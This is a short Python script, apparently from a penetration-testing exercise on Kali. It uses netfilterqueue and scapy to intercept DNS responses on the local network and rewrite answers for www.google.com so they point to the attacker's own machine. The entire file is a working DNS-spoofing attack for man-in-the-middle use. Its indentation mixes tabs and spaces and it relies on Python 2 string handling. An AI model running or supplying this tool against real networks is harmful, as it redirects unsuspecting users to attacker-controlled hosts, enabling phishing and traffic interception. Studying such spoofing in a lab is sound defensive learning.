import netfilterqueue
from scapy.all import *
import socket
import fcntl
import struct


def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  
        struct.pack('256s', 'eth0'[:15])
    )[20:24])



def callback(pkt):
	global ip_address
	scapy_pkt = IP(pkt.get_payload())
	if(scapy_pkt.haslayer(DNSRR)): # If DNS reponse occured
		qname = scapy_pkt[DNSQR].qname
		if('www.google.com' in qname):
			response = DNSRR(rrname=qname, rdata=ip_address)
    			scapy_pkt[DNS].an = response
            		scapy_pkt[DNS].ancount = 1

			del scapy_pkt[IP].len
			del scapy_pkt[IP].chksum
			del scapy_pkt[UDP].len
			del scapy_pkt[UDP].chksum

			pkt.set_payload(str(scapy_pkt))
		
	pkt.accept() 


ip_address = get_ip_address() #Because we're redirecting the user to Kali's website we grab Kali's IP
q=netfilterqueue.NetfilterQueue()
q.bind(1,callback)
q.run()
